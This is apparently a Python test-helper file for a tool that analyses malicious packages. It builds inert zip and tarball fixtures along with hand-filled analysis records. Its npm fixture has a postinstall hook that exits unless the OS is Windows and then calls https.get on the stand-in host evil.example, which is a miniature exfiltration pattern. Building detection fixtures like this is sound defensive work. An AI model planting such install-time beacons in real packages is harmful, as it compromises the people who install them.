"""Synthetic, inert package builders shared by the tests. Nothing here is real malware."""
import io
import json
import struct
import tarfile
import textwrap
import zlib

CRC_TABLE = []
for i in range(256):
    c = i
    for _ in range(8):
        c = (c >> 1) ^ 0xEDB88320 if c & 1 else c >> 1
    CRC_TABLE.append(c)


def zipcrypto(path, files: dict, password: bytes = b"infected"):
    """Writes a ZipCrypto-encrypted, stored zip like the Datadog dataset's; zipfile cannot create one."""
    def crc(k, b):
        return (k >> 8) ^ CRC_TABLE[(k ^ b) & 0xFF]

    out, central = io.BytesIO(), io.BytesIO()
    for name, data in files.items():
        keys = [0x12345678, 0x23456789, 0x34567890]

        def update(p):
            keys[0] = crc(keys[0], p)
            keys[1] = ((keys[1] + (keys[0] & 0xFF)) * 134775813 + 1) & 0xFFFFFFFF
            keys[2] = crc(keys[2], keys[1] >> 24)

        for b in password:
            update(b)
        checksum = zlib.crc32(data)
        plain = bytes(11) + bytes([checksum >> 24]) + data
        enc = bytearray()
        for p in plain:
            t = (keys[2] | 2) & 0xFFFF
            enc.append(p ^ (((t * (t ^ 1)) >> 8) & 0xFF))
            update(p)
        offset = out.tell()
        raw = name.encode()
        out.write(struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 1, 0, 0, 0x21, checksum, len(enc), len(data), len(raw), 0))
        out.write(raw + enc)
        central.write(struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, 1, 0, 0, 0x21, checksum, len(enc),
                                  len(data), len(raw), 0, 0, 0, 0, 0, offset) + raw)
    cd = central.getvalue()
    end = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, len(files), len(files), len(cd), out.tell(), 0)
    path.write_bytes(out.getvalue() + cd + end)


def tgz(files: dict, prefix="package/") -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, src in files.items():
            data = textwrap.dedent(src).encode() if isinstance(src, str) else src
            info = tarfile.TarInfo(prefix + name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def sample(repo, rel, data):
    p = repo / "samples" / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data)
    return p


def prepared(repo, result):
    return json.loads((repo / result["prepared"]).read_text())


NPM = {
    "package.json": json.dumps({"name": "demo-pkg", "version": "1.0.0", "scripts": {
        "postinstall": "npm run setup", "setup": "node lib/install.js || true", "test": "jest"}}),
    "lib/install.js": """
        const os = require('os');
        const util = require('./util');
        if (os.platform() !== 'win32') process.exit(0);
        util.send();
    """,
    "lib/util.js": """
        const https = require('https');
        exports.send = function () { https.get('https://evil.example/c'); };
    """,
}


def anchor(start, end, node_type, line, file="index.js"):
    """A schema-valid anchor for records that are only validated, never checked against bytes."""
    return {"file": file, "derived_from": None, "start_byte": start, "end_byte": end, "node_type": node_type,
            "sha256": f"{start:08x}{end:08x}", "line": line}


def cite(work, file, line, snippet, derived=None, node_type=None):
    """The anchor cite.py would print for SNIPPET on LINE of a prepared package file."""
    from tools.analysis import cite as cite_tool
    from tools.common import anchors
    src, lang = cite_tool.load(work, file, derived)
    node = cite_tool.cite_node(src, lang, line, snippet, node_type, None)
    return anchors.node_anchor(file, src, node, derived)


# A finished record for the NPM fixture: c1 from the candidate set, c2 an out-of-set addition, g1 cited by hand.
def payload(work, behaviour="exfil"):
    """The https.get sink in lib/util.js, reached from install.js through util.send()."""
    return {"behaviour": behaviour, "sink_kind": "network",
            "sink": cite(work, "lib/util.js", 3, "https.get('https://evil.example/c')"),
            "witness": [{"hop": "call", "anchor": cite(work, "lib/install.js", 5, "util.send()")},
                        {"hop": "def", "anchor": cite(work, "lib/util.js", 3, "function () {", node_type="function_expression")}]}


def guard(work, conditions=("c1", "c2")):
    return {"candidate": None, "kind": "early_exit", "arm": "else", "conditions": list(conditions),
            "site": cite(work, "lib/install.js", 4, "if (os.platform() !== 'win32') process.exit(0);")}


def complete(work, **overrides):
    rec = json.loads((work / "record.json").read_text())
    g = rec["gates"][0]
    # The prefilled guard is re-cited by hand as an out-of-set guard, so its candidate is dropped as a duplicate.
    rec["candidate_review"]["dropped"] = [
        {"candidate": q["candidate"], "reason_code": "duplicate_of", "note": "re-cited by hand as the gate's guard"}
        for q in g["guards"] if q.get("candidate")]
    g.update(polarity="activate", effect="enables", purpose="targeting", purpose_reason="Windows victims only",
             guards=[guard(work)],
             then={"min_conditions": 7, "behaviours": ["exfil"], "env_recipe": {"os": "win32"},
                   "recipe_guessed_fields": [], "regions": g["then"]["regions"], "payload": [payload(work)]},
             **{"else": None})
    rec["conditions"][0]["in_scope"] = False
    rec.update(requirements=[{"axis": "network", "value": "evil[.]example", "reason": "exfil"}],
               behaviours={"ungated": [], "gated": ["wrong"]},
               obfuscation={"level": "none", "techniques": [], "decoded": None, "unrecovered": []},
               reachability={"needs_remote": True,
                             "endpoints": [{"indicator": "https://evil.example/c", "role": "exfil_sink"}]},
               attack_type="typosquat", family_hint=None, claude_assessment="malicious",
               assessment_reason="Sends data to a remote host on Windows.", confidence="high")
    rec["conditions"].append({"id": "c2", "category": "username", "api": "os.userInfo().username", "operator": "==",
                              "value": "admin", "value_recovered": "plain", "in_scope": True, "provenance": "in_set",
                              "sites": [{"candidate": None, "anchor": cite(work, "lib/util.js", 3, "exports.send")}]})
    g["expression"] = "c1 && c2"
    rec["package"]["model_name"] = "claude-test"
    rec.update(overrides)
    (work / "record.json").write_text(json.dumps(rec))
    (work / "summary.md").write_text("## Summary\n\nExits unless Windows, then calls https://evil.example/c.\n\n"
                                     "## Notes\n\nNone worth flagging.\n")


def drop_uncited(work, rec, reason="duplicate_of", note="re-cited by hand"):
    """Lists every prefilled candidate the hand-built record no longer cites in candidate_review.dropped."""
    from tools.analysis import write_report
    skel = json.loads((work / "prepared.json").read_text())["record"]
    gone = [i for i in write_report.prefilled_ids(skel) if i not in write_report.cited_ids(rec)]
    rec.setdefault("candidate_review", {"dropped": []})["dropped"] += [
        {"candidate": i, "reason_code": reason, "note": note} for i in gone
        if i not in {d["candidate"] for d in rec["candidate_review"]["dropped"]}]
    return rec
